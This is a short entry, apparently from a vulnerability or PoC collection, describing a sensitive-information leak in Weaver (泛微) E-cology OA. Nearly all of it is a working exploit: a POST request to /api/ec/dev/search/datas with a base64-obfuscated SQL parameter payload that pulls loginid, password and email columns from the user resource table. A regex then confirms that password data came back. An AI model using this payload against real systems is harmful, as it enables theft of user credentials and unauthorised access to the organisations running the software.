# 泛微E-cologydatas存在敏感信息泄漏漏洞

泛微OA ｜ 信息泄露 ｜ —
- **请求**：`POST /api/ec/dev/search/datas HTTP/1.1`

**Payload**
```
type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
```
- **响应特征**：-1 ^(?=.*?datas)(?=.*?id)(?=.*?password).*?$